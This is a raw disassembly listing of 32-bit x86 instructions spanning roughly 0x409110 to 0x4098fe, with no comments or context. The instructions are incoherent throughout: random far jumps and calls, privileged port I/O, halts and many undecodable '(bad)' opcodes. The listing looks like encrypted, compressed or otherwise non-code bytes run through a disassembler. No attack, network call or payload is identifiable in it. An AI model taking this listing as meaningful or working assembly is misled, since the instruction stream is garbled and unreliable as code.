  409110:	test   DWORD PTR [ecx+eax*1+0x1069efc],edi
  409117:	xchg   edi,eax
  409118:	enter  0x8b64,0xc7
  40911c:	aam    0x2a
  40911e:	push   edx
  40911f:	inc    esi
  409120:	push   edi
  409121:	fmul   st,st(7)
  409123:	push   es
  409124:	push   ss
  409125:	add    bl,BYTE PTR [esi]
  409127:	jbe    0x409116
  409129:	outs   dx,DWORD PTR ds:[esi]
  40912a:	cmp    al,0x49
  40912c:	mov    edx,0xa2f411aa
  409131:	stos   DWORD PTR es:[edi],eax
  409132:	mov    esp,0xcd947259
  409137:	sub    edi,DWORD PTR [ebx+0x3b]
  40913a:	cwde   
  40913b:	push   cs
  40913c:	push   0xffffffae
  40913e:	lods   eax,DWORD PTR ds:[esi]
  40913f:	add    ecx,DWORD PTR [edx-0x50]
  409142:	aas    
  409143:	cmc    
  409144:	xor    DWORD PTR [eax],eax
  409146:	sbb    DWORD PTR [esi],edi
  409148:	mov    bl,bl
  40914a:	dec    eax
  40914b:	mov    edi,0xd143bd40
  409150:	inc    ecx
  409151:	cmc    
  409152:	inc    edx
  409153:	loope  0x409153
  409155:	push   edi
  409156:	hlt    
  409157:	aam    0x6e
  409159:	sbb    al,BYTE PTR [eax+0x73]
  40915c:	jg     0x40912e
  40915e:	fcmovb st,st(0)
  409160:	dec    ebp
  409161:	push   es
  409162:	popf   
  409163:	xlat   BYTE PTR ds:[ebx]
  409164:	xchg   edx,eax
  409165:	mov    ebx,0xdf4af343
  40916a:	or     eax,0xa333dd5b
  40916f:	out    dx,al
  409170:	inc    edx
  409171:	fcom   QWORD PTR [edx]
  409173:	inc    esp
  409174:	and    eax,0x2d
  409177:	adc    BYTE PTR [ebx-0x49],bl
  40917a:	jns    0x40914f
  40917c:	xor    bl,BYTE PTR [ebx+0x6e6353f0]
  409182:	hlt    
  409183:	xor    al,0x6e
  409185:	inc    edx
  409186:	dec    edx
  409187:	gs jle 0x4091e2
  40918a:	movntps XMMWORD PTR [ecx],xmm1
  40918d:	cmp    eax,0x290d0902
  409192:	lea    edi,[edx+0x52f22aae]
  409198:	inc    ebp
  409199:	or     eax,0xddc788c7
  40919e:	retf   0x4839
  4091a1:	stc    
  4091a2:	aaa    
  4091a3:	jp     0x40913b
  4091a5:	sbb    DWORD PTR [ebp+0x1d],ecx
  4091a8:	fcom   DWORD PTR [edi-0x1c]
  4091ab:	(bad)  
  4091ac:	adc    BYTE PTR [eax],ch
  4091ae:	add    dh,ah
  4091b0:	cwde   
  4091b1:	add    BYTE PTR [eax+eax*2-0x153d4bba],ah
  4091b8:	mov    ah,0x4e
  4091ba:	push   ecx
  4091bb:	int    0x69
  4091bd:	dec    edx
  4091be:	sub    esp,DWORD PTR [edi+eiz*2-0x6045dd96]
  4091c5:	jl     0x409155
  4091c7:	ins    DWORD PTR es:[edi],dx
  4091c8:	sbb    al,0xb3
  4091ca:	mov    ah,0x92
  4091cc:	enter  0x6aaf,0x1
  4091d0:	hlt    
  4091d1:	jle    0x409217
  4091d3:	or     BYTE PTR [edx-0x74],cl
  4091d6:	ds add ecx,edi
  4091d9:	pop    ecx
  4091da:	(bad)  
  4091dc:	ret    0xefd0
  4091df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091e0:	sub    dl,0x89
  4091e3:	sbb    DWORD PTR [edi+0x6655de86],ebx
  4091e9:	push   esp
  4091ea:	cs js  0x409215
  4091ed:	data16 repz sub al,0xaf
  4091f1:	mov    dl,0xfd
  4091f3:	adc    eax,0xce7129c7
  4091f8:	out    0x1a,eax
  4091fa:	xor    dl,BYTE PTR [esi-0x6f4aea66]
  409200:	into   
  409201:	sub    bl,BYTE PTR [ebx]
  409203:	popa   
  409204:	xor    edi,DWORD PTR [eax]
  409206:	sbb    al,0x85
  409208:	xor    DWORD PTR [eax+0x1a4fecc2],edi
  40920e:	cld    
  40920f:	test   al,0x14
  409211:	push   0x42
  409213:	loopne 0x409216
  409215:	and    bh,dh
  409217:	es cmc 
  409219:	imul   esi,DWORD PTR [ecx],0xffffffbe
  40921c:	lods   al,BYTE PTR ds:[esi]
  40921d:	stos   BYTE PTR es:[edi],al
  40921e:	mov    al,0x52
  409220:	mov    ds:0x180634b5,al
  409225:	push   esp
  409226:	mov    al,al
  409228:	sbb    DWORD PTR [edi+0x706dd3a4],ecx
  40922e:	inc    esi
  40922f:	add    edi,DWORD PTR [eax+0x1c]
  409232:	add    bh,ch
  409234:	out    0xe2,eax
  409236:	sbb    ebx,DWORD PTR [ebp+0x788dbd16]
  40923c:	inc    edx
  40923d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40923e:	leave  
  40923f:	outs   dx,DWORD PTR ds:[esi]
  409240:	test   DWORD PTR [ebp-0x29215ed8],ebx
  409246:	ret    0xc24
  409249:	out    0xdb,al
  40924b:	inc    ebx
  40924c:	jne    0x4091de
  40924e:	xchg   DWORD PTR [edx],ebp
  409250:	ret    0xf557
  409253:	sub    BYTE PTR [esi+0x4801ea45],bh
  409259:	dec    eax
  40925a:	hlt    
  40925b:	daa    
  40925c:	repz fadd DWORD PTR [edi]
  40925f:	ffree  st(4)
  409261:	pop    esi
  409262:	repz ret 0xa205
  409266:	gs push 0xffffffe6
  409269:	repz cwde 
  40926b:	aas    
  40926c:	sub    eax,0xb3a1454
  409271:	aaa    
  409272:	in     al,0xc7
  409274:	fwait
  409275:	in     al,dx
  409276:	push   eax
  409277:	sbb    BYTE PTR [ecx+0x4d],0x27
  40927b:	mov    WORD PTR [ebx+0x5945f228],cs
  409281:	dec    ecx
  409282:	mov    ch,0x80
  409284:	(bad)  [ebx+0x4ff73d09]
  40928a:	or     bl,BYTE PTR [eax-0x7]
  40928d:	sbb    BYTE PTR [ebp+0x70],ch
  409290:	das    
  409291:	or     dh,0x47
  409294:	daa    
  409295:	push   ss
  409296:	out    dx,al
  409297:	mov    dh,ah
  409299:	cmp    eax,0x80f76442
  40929e:	xchg   DWORD PTR [eax-0xcc01b83],ebx
  4092a4:	push   esi
  4092a5:	pop    ds
  4092a6:	xor    al,0x5c
  4092a8:	push   ecx
  4092a9:	and    al,0xf5
  4092ab:	pop    ds
  4092ac:	shr    BYTE PTR [esi-0x8f8bf77],1
  4092b2:	push   es
  4092b3:	lea    edi,[esi+0x6c7d761d]
  4092b9:	mov    eax,ds:0xa803d2ea
  4092be:	ja     0x4092b5
  4092c0:	dec    ebp
  4092c1:	push   edx
  4092c2:	inc    eax
  4092c3:	pushf  
  4092c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092c5:	dec    ebp
  4092c6:	sub    BYTE PTR [eax+0x39],bl
  4092c9:	xor    ebx,ebp
  4092cb:	cmp    edx,DWORD PTR [eax]
  4092cd:	and    ebx,DWORD PTR [edi-0x63636fb]
  4092d3:	jne    0x409352
  4092d5:	push   esp
  4092d6:	inc    edi
  4092d7:	adc    BYTE PTR [ebx+0x25],0xbb
  4092db:	shr    DWORD PTR [esi+0x7c9f8d41],1
  4092e1:	xchg   edi,eax
  4092e2:	lds    edi,FWORD PTR [edi+0x337b065b]
  4092e8:	xor    ebx,esi
  4092ea:	pop    esi
  4092eb:	inc    esi
  4092ec:	jecxz  0x4092df
  4092ee:	xchg   ecx,eax
  4092ef:	outs   dx,DWORD PTR ss:[esi]
  4092f1:	test   eax,0x7ba70b18
  4092f6:	dec    ebp
  4092f7:	sbb    BYTE PTR [ebp+0x66453785],bh
  4092fd:	cmp    BYTE PTR [ecx-0x31],dh
  409300:	retf   
  409301:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409302:	lock jns 0x409297
  409305:	add    eax,0xfa4ad5a3
  40930a:	(bad)  
  40930c:	(bad)  
  40930d:	jbe    0x409322
  40930f:	xchg   ecx,eax
  409310:	xchg   ecx,edi
  409312:	mov    ah,ah
  409314:	sub    esi,DWORD PTR [edx]
  409316:	fcmovu st,st(5)
  409318:	xor    BYTE PTR [ebp-0x66],bl
  40931b:	(bad)
  40931e:	or     eax,0xfb05ee5f
  409323:	inc    DWORD PTR [ebx+esi*2-0x3e]
  409327:	or     dh,bl
  409329:	push   ebp
  40932a:	dec    edi
  40932b:	sahf   
  40932c:	fwait
  40932d:	sti    
  40932e:	dec    esi
  40932f:	stc    
  409330:	push   ebp
  409331:	stos   BYTE PTR es:[edi],al
  409332:	enter  0x49eb,0x85
  409336:	sar    DWORD PTR [edx+0x160e56de],0x0
  40933d:	xor    BYTE PTR [ecx+ecx*1+0x53],0xf
  409342:	es add eax,0x8873114a
  409349:	jp     0x409343
  40934b:	fild   WORD PTR [eax-0x32]
  40934e:	es mov eax,0x7685e079
  409354:	fimul  DWORD PTR [ebp+0x6e]
  409357:	mov    eax,0xfab37bc
  40935c:	jl     0x409330
  40935e:	cwde   
  40935f:	ins    DWORD PTR es:[edi],dx
  409360:	push   esp
  409361:	dec    ebx
  409362:	call   0x1cb0ed85
  409367:	(bad)  
  409368:	ins    DWORD PTR es:[edi],dx
  409369:	repz aam 0xc
  40936c:	xchg   BYTE PTR [edx+0x66e7867a],cl
  409372:	mov    edi,0x225e96fa
  409377:	inc    esi
  409378:	jne    0x409369
  40937a:	adc    BYTE PTR [ebx+0x5b],bh
  40937d:	jecxz  0x409354
  40937f:	push   ds
  409380:	dec    eax
  409381:	in     eax,dx
  409382:	cmc    
  409383:	data16 int3 
  409385:	push   ebp
  409386:	xchg   esp,eax
  409387:	call   0xf166:0xa6a37ac7
  40938e:	xor    eax,0xd30a23ac
  409393:	mov    edx,0x853f8bc6
  409398:	fst    DWORD PTR [esi-0x77b868fd]
  40939e:	in     al,dx
  40939f:	sbb    DWORD PTR [ebx-0x7e],ecx
  4093a2:	jmp    0xe8fb:0x2124aee0
  4093a9:	cmp    ebx,edx
  4093ab:	sub    al,0x16
  4093ad:	nop
  4093ae:	or     ch,bl
  4093b0:	adc    edi,eax
  4093b2:	lds    ebx,FWORD PTR ds:0x4a62ecdc
  4093b8:	push   bp
  4093ba:	into   
  4093bb:	stos   WORD PTR es:[edi],ax
  4093bd:	and    edx,DWORD PTR [ebx]
  4093bf:	loop   0x4093ad
  4093c1:	add    eax,0xafb31fe2
  4093c6:	xor    DWORD PTR [edi+eax*4-0x2b521dc7],0x51c59694
  4093d1:	push   ds
  4093d2:	(bad)  
  4093d3:	mov    al,dl
  4093d5:	inc    ecx
  4093d6:	das    
  4093d7:	hlt    
  4093d8:	jne    0x409386
  4093da:	pop    ebp
  4093db:	push   esp
  4093dc:	enter  0xa5b,0x67
  4093e0:	je     0x40941e
  4093e2:	aas    
  4093e3:	retf   
  4093e4:	test   BYTE PTR [eax+0x7cb364ae],dl
  4093ea:	repnz xlat BYTE PTR ds:[ebx]
  4093ec:	repnz xchg esi,eax
  4093ee:	rcr    ch,1
  4093f0:	push   ebx
  4093f1:	or     BYTE PTR [ecx-0x8],0x8d
  4093f5:	mov    ah,0x62
  4093f7:	ficom  WORD PTR [edx+eax*1-0x1f612a06]
  4093fe:	clc    
  4093ff:	push   edi
  409400:	inc    ebx
  409401:	aam    0xb4
  409403:	inc    ecx
  409404:	loope  0x4093b0
  409406:	inc    eax
  409407:	daa    
  409408:	or     ah,BYTE PTR ds:0x8bfcabef
  40940e:	out    dx,al
  40940f:	ror    DWORD PTR [edi],cl
  409411:	and    DWORD PTR [esi+0x61ec4fde],esp
  409417:	jnp    0x409416
  409419:	cs daa 
  40941b:	mov    edx,0x4ab901b6
  409420:	mov    bh,0xd8
  409422:	push   eax
  409423:	dec    ecx
  409424:	jbe    0x409431
  409426:	and    BYTE PTR [esi+0x32147acc],al
  40942c:	dec    edi
  40942d:	mov    dl,0x1a
  40942f:	pop    ebp
  409430:	stos   BYTE PTR es:[edi],al
  409431:	scas   eax,DWORD PTR es:[edi]
  409432:	xchg   DWORD PTR cs:[edi+0xfe223af],esp
  409439:	shl    BYTE PTR [edx-0x12],0x5b
  40943d:	or     dl,BYTE PTR [edi+0x10]
  409440:	cmp    cl,dl
  409442:	jnp    0x4093d0
  409444:	jge    0x40946f
  409446:	inc    edi
  409447:	dec    edx
  409448:	retf   0x3e9e
  40944b:	pop    esi
  40944c:	inc    ecx
  40944d:	retf   
  40944e:	jo     0x40944d
  409450:	jecxz  0x409440
  409452:	and    al,0x16
  409454:	int    0xf8
  409456:	and    al,BYTE PTR [ecx]
  409458:	int3   
  409459:	cld    
  40945a:	sub    DWORD PTR [ecx+ebx*4-0x1c],0xffffff87
  40945f:	sar    BYTE PTR ds:[esi+0x12],cl
  409463:	pop    ebp
  409464:	fwait
  409465:	lahf   
  409466:	idiv   DWORD PTR [eax]
  409468:	xchg   esp,eax
  409469:	mov    edx,0x362ac3b1
  40946e:	cmp    al,0xa0
  409470:	repz enter 0xc8f1,0x9f
  409475:	xchg   BYTE PTR [ebp-0x62],dl
  409478:	in     eax,dx
  409479:	xchg   edi,eax
  40947a:	dec    ebp
  40947b:	data16 into 
  40947d:	dec    ebx
  40947e:	jmp    0x2a5b3919
  409483:	push   ecx
  409484:	(bad)  
  409485:	jp     0x409463
  409487:	add    al,0x94
  409489:	stos   DWORD PTR es:[edi],eax
  40948a:	and    al,0x1
  40948c:	or     eax,edi
  40948e:	in     al,dx
  40948f:	ds or  al,0xb0
  409492:	(bad)  
  409493:	sbb    al,ch
  409495:	je     0x40942d
  409497:	stc    
  409498:	dec    esi
  409499:	cmp    dh,BYTE PTR [edx]
  40949b:	jge    0x4094ab
  40949d:	mov    edi,0xd559bfdf
  4094a2:	aad    0xba
  4094a4:	mov    al,ds:0x6e26922a
  4094a9:	and    ecx,edx
  4094ab:	(bad)  
  4094ac:	sar    BYTE PTR [ebp-0x1d],1
  4094af:	and    cl,BYTE PTR [esi-0x3e]
  4094b2:	jae    0x40952e
  4094b4:	fcomp  QWORD PTR [esi-0x5a]
  4094b7:	mov    edi,0xb0eefd68
  4094bc:	pop    edx
  4094bd:	hlt    
  4094be:	mov    WORD PTR [edi+0x2a361785],fs
  4094c4:	inc    ecx
  4094c5:	fmulp  st(7),st
  4094c7:	in     eax,dx
  4094c8:	leave  
  4094c9:	mov    ecx,0xea11286c
  4094ce:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4094d0:	jno    0x4094df
  4094d2:	mov    esp,0x5207396
  4094d7:	mov    esp,0x58fa28c9
  4094dc:	pop    ds
  4094dd:	mov    fs,WORD PTR [esi+ebx*1-0x5c]
  4094e1:	sti    
  4094e2:	in     al,dx
  4094e3:	jge    0x4094d7
  4094e5:	packssdw mm4,mm4
  4094e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4094e9:	aaa    
  4094ea:	je     0x40955c
  4094ec:	mov    bh,0xf7
  4094ee:	dec    esi
  4094ef:	sbb    DWORD PTR [edx+eiz*1],esp
  4094f2:	jmp    0x82bfda82
  4094f7:	imul   esp,DWORD PTR [esp+eax*2],0xffffffd8
  4094fb:	pop    edx
  4094fc:	cwde   
  4094fd:	test   BYTE PTR [esi-0x587928e9],0x9a
  409504:	sub    al,BYTE PTR [esi]
  409506:	jmp    FWORD PTR [ecx+0x3c46e89e]
  40950c:	js     0x409571
  40950e:	je     0x4094c2
  409510:	jl     0x4094cd
  409512:	call   0x63c03cfd
  409517:	(bad)  
  409518:	clc    
  409519:	nop
  40951a:	add    al,0x4a
  40951d:	xchg   ebp,eax
  40951e:	and    eax,0x8e890087
  409523:	xchg   esi,eax
  409524:	mov    BYTE PTR [edi],al
  409526:	jo     0x409576
  409528:	aad    0x65
  40952a:	pop    eax
  40952b:	pop    ds
  40952c:	mov    ebx,0x6ae96335
  409531:	pop    esp
  409532:	repnz fmul DWORD PTR [ebx-0x30]
  409536:	add    edx,edi
  409538:	jae    0x409577
  40953a:	cmp    DWORD PTR [ecx],0x6dbdab7
  409540:	cwde   
  409541:	jmp    0x4c58c416
  409546:	fdiv   st(5),st
  409548:	lahf   
  409549:	imul   eax,DWORD PTR [esi],0xfcfa8946
  40954f:	mov    dl,0xb6
  409551:	in     eax,dx
  409552:	addr16 popa 
  409554:	fist   WORD PTR [ecx-0x47f2a781]
  40955a:	and    DWORD PTR [edi+0x46],0x6d986ac8
  409561:	mov    eax,ds:0xe64c64e8
  409566:	ja     0x4094e9
  409568:	xchg   esi,eax
  409569:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40956a:	sub    DWORD PTR [ecx-0x3431378c],ecx
  409570:	mov    al,ds:0xbf596a30
  409575:	pop    esi
  409576:	mov    esi,0x8a28dc32
  40957b:	or     eax,0x52b03494
  409580:	and    bh,dh
  409582:	fcmovnbe st,st(0)
  409584:	cli    
  409585:	call   0xcfa50625
  40958a:	inc    eax
  40958b:	pop    ebp
  40958c:	push   esp
  40958d:	stos   BYTE PTR es:[edi],al
  40958e:	or     BYTE PTR [edi+esi*8-0x31],ch
  409592:	mov    al,ds:0x4ed516b2
  409597:	pop    es
  409598:	shl    DWORD PTR [esi+0x4eb9741b],0x2b
  40959f:	fld    QWORD PTR [esi-0x342aa256]
  4095a5:	mov    dh,BYTE PTR [ebp-0x38d12436]
  4095ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095ac:	and    esi,DWORD PTR [ebx+edi*1-0x516557e1]
  4095b3:	std    
  4095b4:	icebp  
  4095b5:	dec    ebp
  4095b6:	fmul   st,st(2)
  4095b8:	mov    dh,BYTE PTR [edx-0x4c744d7d]
  4095be:	sub    dl,BYTE PTR [ebp-0xd]
  4095c1:	les    eax,FWORD PTR [ebp-0x57]
  4095c4:	mov    bl,0x80
  4095c6:	out    dx,al
  4095c7:	pushf  
  4095c8:	ds adc eax,esi
  4095cb:	pop    ebx
  4095cc:	ret    
  4095cd:	out    dx,eax
  4095ce:	jmp    0x40961f
  4095d0:	(bad)  
  4095d1:	es jmp 0x4794:0x5b569a1e
  4095d9:	inc    esp
  4095da:	fbld   TBYTE PTR [ebx-0x2a]
  4095dd:	imul   edi,DWORD PTR [ebp+ebp*8-0x16dfbf31],0xa8ae09c4
  4095e8:	add    dl,BYTE PTR [edx+0x20d32ab4]
  4095ee:	add    esi,eax
  4095f0:	dec    ebx
  4095f1:	outs   dx,BYTE PTR ds:[esi]
  4095f2:	mov    esi,0x2676a92e
  4095f7:	daa    
  4095f8:	pop    ebp
  4095f9:	fst    st(6)
  4095fb:	mov    al,ds:0xf08149f3
  409600:	pop    edi
  409601:	shr    BYTE PTR [eax+0x5e],1
  409604:	stos   BYTE PTR es:[edi],al
  409605:	outs   dx,DWORD PTR ds:[esi]
  409606:	sbb    DWORD PTR [eax-0x17],eax
  409609:	repnz push es
  40960b:	mov    ecx,edi
  40960d:	cs ret 0xd950
  409611:	inc    edi
  409612:	outs   dx,BYTE PTR ds:[esi]
  409613:	push   ebp
  409614:	in     al,0x4
  409616:	cs call 0x9d09adce
  40961c:	push   ss
  40961d:	ret    0x12e2
  409620:	or     cl,al
  409622:	mov    al,0x6c
  409624:	std    
  409625:	and    BYTE PTR [edi],0x60
  409628:	or     eax,0xe805d50f
  40962d:	outs   dx,BYTE PTR ds:[esi]
  40962e:	fiadd  DWORD PTR ds:0x2154606c
  409634:	sar    BYTE PTR [eax-0x503fd090],1
  40963a:	repnz dec eax
  40963c:	sbb    al,0x9c
  40963e:	and    BYTE PTR [ecx],ah
  409640:	push   cs
  409641:	int    0xb7
  409643:	and    eax,DWORD PTR [ebx]
  409645:	mov    al,BYTE PTR [edx-0x1ceca6d3]
  40964b:	cmp    edi,DWORD PTR [eax+0x59]
  40964e:	imul   ecx,ebp,0x5b2dcb31
  409654:	mov    ebp,DWORD PTR [ebx]
  409656:	into   
  409657:	daa    
  409658:	jmp    0xde4:0x9ee49faf
  40965f:	lock pop eax
  409661:	popa   
  409662:	das    
  409663:	pop    eax
  409664:	pusha  
  409665:	(bad)  
  409666:	(bad)  
  409667:	cmp    eax,0xa5c5b4c9
  40966c:	xchg   esi,ebx
  40966e:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  409670:	add    dh,BYTE PTR [edx+0x65]
  409673:	sub    ch,BYTE PTR [edi]
  409675:	adc    edi,edi
  409677:	shr    BYTE PTR [esi+0x7445a3a3],cl
  40967d:	out    0x4,al
  40967f:	dec    edi
  409680:	nop
  409681:	xchg   dx,ax
  409683:	leave  
  409684:	test   DWORD PTR [edi+0x7],ebp
  409687:	fistp  WORD PTR [esi+0x2b]
  40968a:	add    ch,BYTE PTR [ebp-0x205625b5]
  409690:	or     al,0x14
  409692:	repnz add ebx,ebp
  409695:	call   0x8970e6b7
  40969a:	aas    
  40969b:	(bad)  [ecx-0x9]
  40969e:	lds    eax,FWORD PTR [edi-0xab0ce75]
  4096a4:	sti    
  4096a5:	test   al,0x87
  4096a7:	jmp    0x409662
  4096a9:	fild   WORD PTR es:[ebx-0x37]
  4096ad:	mov    cl,0x49
  4096af:	dec    edx
  4096b0:	jno    0x4096d3
  4096b2:	and    ebx,DWORD PTR [esi+0x5daa6813]
  4096b8:	pop    ecx
  4096b9:	add    DWORD PTR [esi+0x5c],esp
  4096bc:	and    DWORD PTR [eax+0x107a60e6],ebp
  4096c2:	loope  0x409685
  4096c4:	shr    DWORD PTR [edi],cl
  4096c6:	jge    0x409714
  4096c8:	xchg   ebx,eax
  4096c9:	cmc    
  4096ca:	cdq    
  4096cb:	xor    DWORD PTR [edx],esi
  4096cd:	push   es
  4096ce:	scas   al,BYTE PTR es:[edi]
  4096cf:	jo     0x40968e
  4096d1:	xchg   esp,eax
  4096d2:	cmp    ah,BYTE PTR [edi+0x1c]
  4096d5:	pushf  
  4096d6:	adc    DWORD PTR [eax-0x7cd5a5cf],ebp
  4096dc:	hlt    
  4096dd:	xor    BYTE PTR [edi+ebx*4],bl
  4096e0:	sbb    DWORD PTR [edx-0x4],edi
  4096e3:	pop    ebp
  4096e4:	bnd jl 0x40973b
  4096e7:	call   0x397b5b77
  4096ec:	pop    ebx
  4096ed:	jo     0x4096d2
  4096ef:	mov    ecx,0x2096f9f2
  4096f4:	push   ebp
  4096f5:	or     ch,dl
  4096f7:	jno    0x40972a
  4096f9:	or     DWORD PTR [ebx+0x6983b2fe],0x3fd3883d
  409703:	pop    ds
  409704:	fisub  DWORD PTR [edi-0x225899a9]
  40970a:	jge    0x409743
  40970c:	push   esp
  40970d:	inc    ecx
  40970e:	pushf  
  40970f:	and    DWORD PTR [esi],eax
  409711:	inc    edx
  409712:	jno    0x40978c
  409714:	adc    edx,0x2f5d0737
  40971a:	dec    ebp
  40971b:	cdq    
  40971c:	jo     0x40977f
  40971e:	hlt    
  40971f:	in     al,0x98
  409721:	in     eax,dx
  409722:	cmp    BYTE PTR [edi],ch
  409724:	xchg   ecx,eax
  409725:	cmp    bl,dl
  409727:	and    BYTE PTR [esi],dl
  409729:	jns    0x409729
  40972b:	sbb    esi,edi
  40972d:	xchg   ecx,eax
  40972e:	push   eax
  40972f:	mov    bl,0xea
  409731:	es push ds
  409733:	cdq    
  409734:	test   BYTE PTR [ebp-0x746f0b11],bh
  40973a:	pop    ss
  40973b:	xlat   BYTE PTR ds:[ebx]
  40973c:	(bad)  
  40973d:	pop    ebp
  40973e:	xchg   eax,ebp
  409740:	dec    edi
  409741:	mov    bh,0x9f
  409743:	mov    bl,0xb8
  409745:	xchg   ecx,eax
  409746:	pop    ebx
  409747:	aad    0xf9
  409749:	stos   BYTE PTR es:[edi],al
  40974a:	push   es
  40974b:	jb     0x4096e7
  40974d:	mov    al,ds:0xff339f4a
  409752:	push   ecx
  409753:	test   ecx,esi
  409755:	icebp  
  409756:	es pop esp
  409758:	shl    edx,cl
  40975a:	mov    al,ds:0x74b3b89d
  40975f:	cli    
  409760:	repz add DWORD PTR [esi+0x4a],esi
  409764:	fnstcw WORD PTR [edi-0x39]
  409767:	(bad)
  40976b:	fistp  WORD PTR ds:0x27cbffe9
  409771:	lds    eax,FWORD PTR [edi-0x14]
  409774:	jmp    0x88e1:0xf65d973
  40977b:	shl    BYTE PTR [eax+0x1d],1
  40977e:	and    al,0x33
  409780:	adc    al,0xe6
  409782:	adc    esp,eax
  409784:	pop    ebp
  409785:	int    0xce
  409787:	sub    BYTE PTR [ebx],0x0
  40978a:	dec    ecx
  40978b:	pop    ds
  40978c:	lock mov ch,0xd0
  40978f:	cwde   
  409790:	push   cs
  409791:	repnz lea edx,[ebp+0x45]
  409795:	xchg   esi,eax
  409796:	sub    bh,0xa1
  409799:	or     al,0xee
  40979b:	outs   dx,DWORD PTR ds:[esi]
  40979c:	out    0x1e,eax
  40979e:	push   0x7a2216ed
  4097a3:	out    0x47,eax
  4097a5:	pop    ss
  4097a6:	and    BYTE PTR [edi+0x38],ah
  4097a9:	and    al,BYTE PTR [eax+0x202aae1f]
  4097af:	mov    al,ds:0xad418272
  4097b4:	mov    edx,0x48fbc6eb
  4097b9:	jnp    0x409785
  4097bb:	cli    
  4097bc:	xchg   BYTE PTR [edx-0xa],al
  4097bf:	repnz and dh,cl
  4097c2:	xor    esp,DWORD PTR [ecx-0x7a]
  4097c5:	sub    ebp,edx
  4097c7:	jp     0x4097a5
  4097c9:	out    dx,eax
  4097ca:	sub    BYTE PTR [edi+0x14],ch
  4097cd:	inc    eax
  4097ce:	sar    DWORD PTR [edx+ebp*2],1
  4097d1:	in     al,0x13
  4097d3:	imul   esi,DWORD PTR [ebx],0x242b6c86
  4097d9:	adc    DWORD PTR cs:[edi+0x2d96b8e4],ecx
  4097e0:	test   ah,al
  4097e2:	dec    esi
  4097e3:	xchg   esi,eax
  4097e4:	pop    esi
  4097e5:	add    al,0xa2
  4097e7:	xchg   edi,eax
  4097e8:	xor    ecx,edx
  4097ea:	aaa    
  4097eb:	clc    
  4097ec:	clc    
  4097ed:	push   eax
  4097ee:	xchg   esp,eax
  4097ef:	in     eax,0x7f
  4097f1:	jl     0x409865
  4097f3:	inc    ebx
  4097f4:	adc    dl,0xfa
  4097f7:	push   ebp
  4097f8:	ret    0x14b9
  4097fb:	dec    esp
  4097fc:	push   0x22acf42d
  409801:	add    al,0xa2
  409803:	xor    BYTE PTR [esp+esi*8-0x30],0xfe
  409808:	push   eax
  409809:	inc    edi
  40980a:	sbb    dl,ah
  40980c:	lea    esi,[edi]
  40980e:	jne    0x4097e6
  409810:	repz xor esi,DWORD PTR [ebx]
  409813:	mov    esi,DWORD PTR [eax+0x19]
  409816:	pusha  
  409817:	(bad)  
  409818:	jbe    0x4097cf
  40981a:	push   es
  40981b:	jmp    0x78102b09
  409820:	stos   BYTE PTR es:[edi],al
  409821:	jae    0x4098a2
  409823:	gs dec eax
  409825:	mov    ds:0x668f37f,eax
  40982a:	sub    bl,BYTE PTR [ebp-0x3d66708c]
  409830:	pusha  
  409831:	push   ds
  409832:	adc    edx,edi
  409834:	fadd   st,st(1)
  409836:	outs   dx,DWORD PTR ds:[esi]
  409837:	stos   BYTE PTR es:[edi],al
  409838:	push   eax
  409839:	inc    ebx
  40983a:	fnstcw WORD PTR [ebx]
  40983c:	sub    DWORD PTR [ecx],0x6c4690e1
  409842:	sbb    al,0xb8
  409844:	jl     0x4098c2
  409846:	js     0x40984d
  409848:	dec    ecx
  409849:	pop    di
  40984b:	repz mov bh,0xc
  40984e:	jnp    0x4097ed
  409850:	ror    DWORD PTR [edi-0x20730b05],1
  409856:	jl     0x409805
  409858:	rol    BYTE PTR [ecx-0x42],0x4d
  40985c:	mov    ds,eax
  40985e:	push   cs
  40985f:	pushf  
  409860:	neg    BYTE PTR [esi+0x5a]
  409863:	sub    dl,cl
  409865:	std    
  409866:	jmp    0xdb70fe14
  40986b:	lea    ecx,cs:[ebp+eiz*4+0x5f93a0d9]
  409873:	cmp    ch,BYTE PTR [eax+0x12abfc87]
  409879:	mov    edx,0xb7fff068
  40987e:	mov    ah,0x51
  409880:	ret    
  409881:	data16 mov bl,0x61
  409884:	add    ebp,DWORD PTR [ecx]
  409886:	jle    0x4098eb
  409888:	jl     0x4098b3
  40988a:	cli    
  40988b:	shl    DWORD PTR [eax+0xe],cl
  40988e:	mov    edi,0xc7d74cb
  409893:	lods   eax,DWORD PTR ds:[esi]
  409894:	addr16 or ch,dh
  409897:	(bad)  
  409898:	sahf   
  409899:	jnp    0x4098e8
  40989b:	cmp    eax,0xe2c002d7
  4098a0:	inc    ebx
  4098a1:	(bad)  
  4098a2:	xor    BYTE PTR [ebx-0x23],bh
  4098a5:	fisttp DWORD PTR [ecx-0x4a]
  4098a8:	retf   0x772e
  4098ab:	data16 jnp 0x409853
  4098ae:	repnz cmp dl,BYTE PTR [esi-0x5726790]
  4098b5:	pop    es
  4098b6:	mov    ah,0xfd
  4098b8:	out    dx,al
  4098b9:	cs jecxz 0x409934
  4098bc:	call   0x2c97431b
  4098c1:	push   0x32bae3db
  4098c6:	dec    ecx
  4098c7:	mov    dl,BYTE PTR [ebx]
  4098c9:	(bad)  
  4098ca:	or     al,0x86
  4098cc:	jg     0x409943
  4098ce:	popa   
  4098cf:	in     al,dx
  4098d0:	xor    al,0x37
  4098d2:	outs   dx,DWORD PTR ds:[esi]
  4098d3:	push   es
  4098d4:	out    0x76,al
  4098d6:	sbb    DWORD PTR [eax],edi
  4098d8:	push   edx
  4098d9:	pop    edi
  4098da:	mov    eax,0x5621a3f
  4098df:	in     eax,0xc2
  4098e1:	aaa    
  4098e2:	retf   0xf3a1
  4098e5:	jb     0x40987e
  4098e7:	sub    bl,bl
  4098e9:	ins    DWORD PTR es:[edi],dx
  4098ea:	dec    ebp
  4098eb:	push   0x36
  4098ed:	iret   
  4098ee:	xchg   esp,eax
  4098ef:	mov    esi,0x135ef0c2
  4098f4:	test   ch,ch
  4098f6:	push   edx
  4098f7:	sbb    eax,0xe09699cb
  4098fc:	(bad)  
  4098fd:	dec    ecx
  4098fe:	push   ecx
